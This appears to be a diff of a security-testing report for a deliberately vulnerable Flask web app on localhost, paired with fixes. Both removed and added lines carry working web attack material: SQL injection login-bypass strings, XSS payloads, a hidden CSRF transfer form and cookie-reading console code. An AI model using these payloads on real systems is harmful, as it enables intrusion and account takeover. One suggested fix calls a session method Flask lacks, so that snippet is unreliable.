@@ -1,6 +1,6 @@
-# Hacker's Report: Breaking into the Client’s PWA
+# Hacker's Report: Breaking into the Client's PWA
 
-This document outlines the security vulnerabilities identified in the client’s Progressive Web App (PWA). It provides detailed replication steps, explanations of why each vulnerability exists, and recommendations for fixes. The testing methodologies used include **blackbox**, **whitebox**, and **greybox testing**, along with **Google Lighthouse** audits.
+This document outlines the security vulnerabilities identified in the client's Progressive Web App (PWA). It provides detailed replication steps, explanations of why each vulnerability exists, and recommendations for fixes. The testing methodologies used include **blackbox**, **whitebox**, and **greybox testing**, along with **Google Lighthouse** audits.
 
 ---
 
@@ -38,398 +38,244 @@ The login form allows SQL injection through both username and password fields, d
    ```
 4. Click Login
 
-##### SQL Injection Payloads or 1=1
-
-or 1=1--
-
-or 1=1#
-
-or 1=1/*
-
-admin' --
-
-admin' #
-
-admin'/*
-
-admin' or '1'='1
-
-admin' or '1'='1'--
-
-admin' or '1'='1'#
-
-admin' or '1'='1'/*
-
-admin'or 1=1 or ''='
-
-admin' or 1=1
-
-admin' or 1=1--
-
-admin' or 1=1#
-
-admin' or 1=1/*
-
-admin') or ('1'='1
-
-admin') or ('1'='1'--
-
-admin') or ('1'='1'#
-
-admin') or ('1'='1'/*
-
-admin') or '1'='1
-
-admin') or '1'='1'--
-
-admin') or '1'='1'#
-
-admin') or '1'='1'/*
-
-1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
-
-admin" --
-
-admin" #
-
-admin"/*
-
-admin" or "1"="1
-
-admin" or "1"="1"--
-
-admin" or "1"="1"#
-
-admin" or "1"="1"/*
-
-admin"or 1=1 or ""="
-
-admin" or 1=1
-
-admin" or 1=1--
-
-admin" or 1=1#
-
-admin" or 1=1/*
-
-admin") or ("1"="1
-
-admin") or ("1"="1"--
-
-admin") or ("1"="1"#
-
-admin") or ("1"="1"/*
-
-admin") or "1"="1
-
-admin") or "1"="1"--
-
-admin") or "1"="1"#
-
-admin") or "1"="1"/*
-
-1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
-
-
-
-#### **Expected Result**
-- Both methods will result in successful login
-- The server will log the executed SQL query showing the injection
-
-#### **Why This Happens**
-- The application builds SQL queries by directly concatenating user input:
-  ```python
-  query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
-  ```
-- No input sanitization or parameter binding
-- The `OR '1'='1'` makes the WHERE clause always true
-- The `--` in the password method comments out the rest of the query
-
-#### **Google Lighthouse Insights**
-- Flagged missing `Content-Security-Policy` headers
-- Highlighted potential for data exfiltration
-
-#### **Recommendation**
-- Use parameterized queries to prevent SQL injection:
-  ```python
-  c.execute("SELECT * FROM users WHERE username = ? AND password = ?", 
-           (username, password))
-  ```
-- Implement proper input validation
-- Use an ORM like SQLAlchemy
-- Add proper error handling and logging
-- Never concatenate raw user input into SQL queries
-
-### **2. XSS (Cross-Site Scripting)**
-
-#### **Description**
-The search bar renders user input directly, allowing malicious scripts to execute.
-
-#### **Steps to Replicate**
-1. Navigate to the Search Page: `http://127.0.0.1:5000/search`
-2. Enter the following in the search bar:
-   ```html
-   <script>alert('XSS Vulnerability!');</script>
-   ```
-3. Submit the form.
-
-#### **Expected Result**
-A browser popup displays the alert message "XSS Vulnerability!".
-
-#### **Why This Happens**
-- User input is rendered in the DOM without sanitization.
-
-#### **Google Lighthouse Insights**
-- Missing Content-Security-Policy headers flagged.
-- Warned about the absence of X-XSS-Protection.
-
-#### **Recommendation**
-- Escape user input before rendering it:
-   ```python
-   from markupsafe import escape
-   return f"Search results for: {escape(query)}"
-   ```
-
-### **3. CSRF (Cross-Site Request Forgery)**
-
-#### **Description**
-The transfer endpoint lacks CSRF protection, allowing unauthorized transactions when a user is authenticated.
-
-#### **Test Environment Setup**
-1. **Initial Setup**:
-   ```bash
-   # Create a directory for the malicious site
-   mkdir csrf-attack
-   cd csrf-attack
-   ```
-
-2. **Create the Malicious Site**:
-   Create `evil.html`:
-   ```html
-   <!DOCTYPE html>
-   <html>
-   <head>
-       <title>Win a Prize!</title>
-       <style>
-           body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
-           button { padding: 15px 30px; font-size: 18px; background-color: #4CAF50; 
-                   color: white; border: none; cursor: pointer; }
-           button:hover { background-color: #45a049; }
-       </style>
-   </head>
-   <body>
-       <h1>🎉 Congratulations! You've Won! 🎉</h1>
-       <h2>Click below to claim your $100 prize!</h2>
-       <button onclick="document.getElementById('csrf-form').submit()">
-           🎁 Claim Your Prize Now! 🎁
-       </button>
-       
-       <!-- Hidden CSRF form -->
-       <form id="csrf-form" action="http://localhost:5000/transfer" 
-             method="POST" style="display: none;">
-           <input type="hidden" name="to_user" value="admin">
-           <input type="hidden" name="amount" value="100">
-       </form>
-   </body>
-   </html>
-   ```
-
-#### **Testing Steps**
-
-1. **Start the Main Application**:
-   ```bash
-   # Terminal 1 - Main application
-   cd flask-pwa-security
-   python app.py
-   ```
-
-2. **Start the Malicious Server**:
-   ```bash
-   # Terminal 2 - Attacker's server
-   cd csrf-attack
-   python -m http.server 8080
-   ```
-
-3. **Setup Test Accounts**:
-   - Register two accounts:
-     1. Username: `user`, Password: `password123`
-     2. Username: `admin`, Password: `adminpass`
-   - Each account starts with different balances:
-     - user: $500
-     - admin: $1000
-
-4. **Test Normal Transfer**:
-   1. Login as `user` at `http://localhost:5000/login`
-   2. Go to `http://localhost:5000/transfer`
-   3. Make a legitimate transfer:
-      - To: admin
-      - Amount: $10
-   4. Verify balance changes correctly
-
-5. **Test CSRF Attack**:
-   1. Ensure you're still logged in as `user`
-   2. Note your current balance
-   3. In a new tab, visit `http://localhost:8080/evil.html`
-   4. Click the "Claim Your Prize Now!" button
-   5. Check your balance at `http://localhost:5000/transfer`
-   6. You should see $100 transferred to admin without your consent
-
-6. **Verify Attack Success**:
-   - Check `/transfer` page for new balance
-   - Login as admin to verify received amount
-   - Check browser network tab for request details
-
-#### **Testing Variations**
-
-1. **Different Browsers**:
-   - Test in Chrome, Firefox, and Edge
-   - Each maintains separate cookie storage
-   - Attack should work across all browsers
-
-2. **Multiple Attacks**:
-   - Try clicking multiple times
-   - Verify each attempt processes if funds available
-   - Check balance deduction accuracy
-
-3. **Session Testing**:
-   - Try after session timeout
-   - Test with logged-out user
-   - Verify attack fails without valid session
-
-#### **Common Issues**
-
-1. **Server Errors**:
-   - 401 Unauthorized: Not logged in
-   - 400 Bad Request: Invalid amount/user
-   - 500 Server Error: Check app logs
-
-2. **Troubleshooting**:
-   - Verify both servers running (ports 5000 and 8080)
-   - Check user logged in before testing
-   - Ensure sufficient balance for transfer
-   - Clear browser cache if needed
-
-#### **Impact Analysis**
-1. **Financial Impact**:
-   - Unauthorized transfers possible
-   - Multiple transfers can drain account
-   - No confirmation required
-
-2. **Security Implications**:
-   - Exploits user's authenticated session
-   - Works across different origins
-   - No transaction verification needed
-
-#### **Detection Methods**
-1. Monitor for:
-   - Unusual transfer patterns
-   - Multiple rapid transfers
-   - Transfers from unexpected origins
-
-#### **Mitigation Testing**
-After implementing fixes, verify that:
-1. Requests with invalid CSRF tokens fail
-2. Cross-origin requests are blocked
-3. SameSite cookie attribute prevents attack
-4. Origin/referer validation works
-
-#### **Recommendation**
-1. Implement CSRF tokens:
-   ```python
-   from flask_wtf.csrf import CSRFProtect
-   csrf = CSRFProtect(app)
-   ```
-
-2. Add CSRF token to forms:
-   ```html
-   <form method="POST">
-       {{ csrf_token() }}
-       <!-- form fields -->
-   </form>
-   ```
-
-3. Use SameSite cookie attribute:
-   ```python
-   app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
-   ```
-
-4. Validate origin/referer headers:
-   ```python
-   if request.headers.get('Origin') != 'http://yourdomain.com':
-       abort(403)
-   ```
-
-5. Add transaction confirmation:
-   ```python
-   # Generate and verify one-time tokens for transfers
-   @app.route('/confirm_transfer/<token>')
-   def confirm_transfer(token):
-       if verify_token(token):
-           execute_transfer()
-   ```
+##### Alternative SQL Injection Payloads
+
+1. Using LIKE operator:
+```sql
+admin' OR username LIKE '%admin%
+```
+
+2. Using boolean logic:
+```sql
+x' OR 'a'='a
+```
+
+3. Using comments:
+```sql
+admin'--
+```
+
+4. Using OR with numbers:
+```sql
+admin' OR 5>3--
+```
+
+5. Using UNION:
+```sql
+admin' UNION SELECT 'admin', '123
+```
+
+#### **Why These Work**
+- `OR '1'='1` - Always evaluates to TRUE
+- `--` - Comments out remaining SQL
+- `UNION` - Combines queries
+- The server logs all SQL queries, allowing observation of injection effects
+
+#### **How to Test Systematically**
+1. Go to Login Page
+2. Try different payloads in either field
+3. Check server logs for query execution
+4. Observe authentication bypass
 
 ### **4. Insecure API Endpoint**
 
 #### **Description**
-The API accepts and stores malicious payloads without validation.
+The API endpoint is vulnerable to multiple attack vectors including XSS through JSON data and lacks proper authentication.
 
 #### **Steps to Replicate**
-1. Create an HTML form to simulate an API request:
-   ```html
-   <form method="POST" action="http://127.0.0.1:5000/api/data">
-       <textarea name="data">{"data": "<script>alert('API Vulnerability!');</script>"}</textarea>
-       <button type="submit">Send</button>
-   </form>
-   ```
-2. Open the form in your browser and click Send.
-3. Check the `data.json` file.
 
-#### **Expected Result**
-The malicious payload is stored unmodified:
+##### Method 1: Direct API Access
+1. Access the API endpoint directly: `http://127.0.0.1:5000/api/data`
+2. Send POST request with malicious payload:
    ```json
    {
-       "data": "<script>alert('API Vulnerability!');</script>"
+     "data": "<script>alert('API Vulnerability!');</script>"
    }
    ```
 
-#### **Why This Happens**
-- The API does not validate or sanitize incoming JSON payloads.
+##### Method 2: XSS Through JSON
+1. Create a test HTML file (test_api.html):
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test API Vulnerability</title>
+</head>
+<body>
+    <h2>Test API Vulnerability</h2>
+    <form id="apiForm" onsubmit="submitForm(event)">
+        <textarea id="jsonData" style="width: 300px; height: 100px">{"data": "<script>alert('API Vulnerability!');</script>"}</textarea>
+        <br><br>
+        <button type="submit">Send</button>
+    </form>
 
-#### **Google Lighthouse Insights**
-- Missing security headers like Access-Control-Allow-Origin flagged.
+    <script>
+        function submitForm(event) {
+            event.preventDefault();
+            const data = document.getElementById('jsonData').value;
+            fetch('http://127.0.0.1:5000/api/data', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: data
+            })
+            .then(response => response.json())
+            .then(result => alert('Success: ' + JSON.stringify(result)))
+            .catch(error => alert('Error: ' + error));
+        }
+    </script>
+</body>
+</html>
+```
+
+##### Alternative XSS Payloads
+1. Image-based XSS:
+```json
+{
+  "data": "<img src=x onerror='alert(\"XSS\")'>"
+}
+```
+
+2. SVG-based XSS:
+```json
+{
+  "data": "<svg onload='alert(\"XSS\")'>"
+}
+```
+
+#### **Why It's Vulnerable**
+1. No input sanitization on JSON data
+2. Stored XSS through API endpoint
+3. No authentication required for API access
+4. No Content-Security-Policy headers
+5. Direct rendering of user input
+
+#### **Expected Results**
+- Successful POST requests store unsanitized data
+- XSS payloads execute when data is rendered
+- No authentication barriers prevent API access
 
 #### **Recommendation**
-- Validate and sanitize JSON payloads before processing:
-   ```python
-   if not isinstance(request.json['data'], str):
-       return jsonify({"error": "Invalid data format"}), 400
-   ```
+1. Implement proper input sanitization for JSON data
+2. Add authentication to API endpoints
+3. Implement Content-Security-Policy headers
+4. Validate and escape all user input before storage or rendering
+5. Add rate limiting to prevent abuse
 
-### **5. Broken Access Control**
+### **5. Unprotected Sessions**
 
 #### **Description**
-The application exposes user data through predictable IDs without proper authorization checks.
+The application uses insecure session management that can be exploited through session hijacking and persistence attacks. Sessions are configured with weak security settings and expose sensitive data.
+
+#### **Vulnerabilities Found**
+1. Sessions accessible via JavaScript (no HttpOnly flag)
+2. Sessions work over HTTP (no Secure flag)
+3. No SameSite cookie protection
+4. Extremely long session duration (365 days)
+5. No session rotation on login
+6. No proper session invalidation
 
 #### **Steps to Replicate**
-1. Access the endpoint directly: `http://localhost:5000/user/1`
-2. Try different IDs: `/user/2`, `/user/3`, etc.
-3. Note that no authentication is required
 
-#### **Expected Result**
-- Direct access to user data
-- JSON response with user details
-- No authorization checks performed
+##### Method 1: Session Inspection and Hijacking
+1. First, log in to the application:
+   - Go to `http://127.0.0.1:5000/login`
+   - Use SQL injection to login:
+     - Username: `admin' OR '1'='1`
+     - Password: (any value)
 
-#### **Why This Happens**
-- No authentication check before accessing data
-- Direct exposure of database IDs
-- Missing access control checks
+2. Navigate to the Report Page: `http://127.0.0.1:5000/report`
+
+3. Open Browser DevTools (F12) and in Console, execute either:
+   ```javascript
+   // View all cookies
+   console.log(document.cookie)
+
+   // Or for better readability, use:
+   document.cookie.split(';').forEach(cookie => console.log(cookie.trim()))
+   ```
+
+4. Note that session cookie is accessible via JavaScript, which makes it vulnerable to XSS attacks
+
+**Important**: You must run these commands while on a page from the Flask application (like `/report` or `/login`). The commands won't work if you try them on a different domain or local file.
+
+##### Method 2: Session Persistence Test
+1. Log in using the steps from Method 1
+2. Note your session cookie value using the console commands above
+3. Close your browser completely
+4. Open a new browser window
+5. Go to `http://127.0.0.1:5000/report`
+6. You should still be logged in
+7. Check that the session cookie value remains the same
+
+##### Method 3: Cross-Site Testing
+1. While logged in, open the browser console (F12)
+2. Execute this cross-origin request:
+   ```javascript
+   fetch('http://127.0.0.1:5000/api/data', {
+       credentials: 'include'  // This will send cookies
+   }).then(r => r.json()).then(console.log)
+   ```
+3. Note that the request succeeds due to missing SameSite protection
+
+#### **Vulnerable Configuration**
+From app.py:
+```python
+# Session Configuration (Intentionally Vulnerable)
+app.permanent_session_lifetime = timedelta(days=365)  # Extremely long session
+app.config['SESSION_COOKIE_SECURE'] = False  # Allow HTTP (not HTTPS only)
+app.config['SESSION_COOKIE_HTTPONLY'] = False  # Allow JavaScript access
+app.config['SESSION_COOKIE_SAMESITE'] = None  # Allow cross-site requests
+```
+
+#### **Impact**
+1. **Session Hijacking**: Attackers can steal session cookies through XSS or malicious JavaScript
+2. **Persistence Abuse**: Sessions remain valid for extremely long periods
+3. **Cross-Site Attacks**: Missing SameSite protection enables CSRF attacks
+4. **Man-in-the-Middle**: Non-secure cookies can be intercepted over HTTP
 
 #### **Recommendation**
-- Implement proper authentication
-- Use indirect references
-- Add authorization checks
-- Implement role-based access control
+1. Implement secure session configuration:
+   ```python
+   # Secure Configuration
+   app.config.update(
+       SESSION_COOKIE_SECURE=True,        # HTTPS only
+       SESSION_COOKIE_HTTPONLY=True,      # No JavaScript access
+       SESSION_COOKIE_SAMESITE='Strict',  # Prevent CSRF
+       PERMANENT_SESSION_LIFETIME=timedelta(hours=1)  # Short lifetime
+   )
+   ```
+
+2. Implement session security measures:
+   ```python
+   @app.before_request
+   def secure_session():
+       # Rotate session ID on login
+       if 'user_id' in session and 'session_created' not in session:
+           session.regenerate()
+           session['session_created'] = datetime.now()
+       
+       # Expire old sessions
+       if 'session_created' in session:
+           created = session['session_created']
+           if datetime.now() - created > timedelta(hours=1):
+               session.clear()
+   ```
+
+3. Add security headers:
+   ```python
+   @app.after_request
+   def add_security_headers(response):
+       response.headers['Strict-Transport-Security'] = 'max-age=31536000'
+       response.headers['Content-Security-Policy'] = "default-src 'self'"
+       return response
+   ```
+
+4. Implement proper session cleanup:
+   - Clear sessions on logout
+   - Implement server-side session tracking
+   - Add rate limiting for session creation
 
 ### **6. Weak Password Storage**
 
